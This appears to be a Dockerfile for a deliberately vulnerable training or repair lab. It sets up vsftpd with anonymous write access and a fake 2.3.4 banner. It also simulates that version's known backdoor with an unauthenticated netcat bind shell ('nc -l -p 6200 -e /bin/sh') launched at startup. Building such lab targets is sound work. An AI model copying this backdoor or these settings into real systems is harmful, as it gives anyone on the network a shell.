FROM sysrepair/meta2-hardy:latest
# Install vsftpd from repos (clean version) and netcat for backdoor simulation
RUN apt-get update && \
    DEBIAN_FRONTEND=noninteractive apt-get install -y vsftpd netcat && \
    apt-get clean

# Configure vsftpd for anonymous and local access
RUN sed -i 's/^#\?anonymous_enable=.*/anonymous_enable=YES/' /etc/vsftpd.conf && \
    sed -i 's/^#\?local_enable=.*/local_enable=YES/' /etc/vsftpd.conf && \
    sed -i 's/^#\?write_enable=.*/write_enable=YES/' /etc/vsftpd.conf && \
    echo "listen=YES" >> /etc/vsftpd.conf && \
    echo "listen_ipv6=NO" >> /etc/vsftpd.conf && \
    echo "ftpd_banner=220 (vsFTPd 2.3.4)" >> /etc/vsftpd.conf

# Simulate the vsftpd 2.3.4 backdoor: netcat listener on port 6200
# The real backdoor opens a root shell on port 6200 when triggered by a :) in username
RUN echo '#!/bin/bash' > /usr/local/bin/backdoor.sh && \
    echo 'while true; do nc -l -p 6200 -e /bin/sh; done' >> /usr/local/bin/backdoor.sh && \
    chmod +x /usr/local/bin/backdoor.sh

# Create startup script
RUN echo '#!/bin/bash' > /start.sh && \
    echo '/usr/local/bin/backdoor.sh &' >> /start.sh && \
    echo '/usr/sbin/vsftpd /etc/vsftpd.conf' >> /start.sh && \
    chmod +x /start.sh

EXPOSE 21 6200

CMD ["/start.sh"]
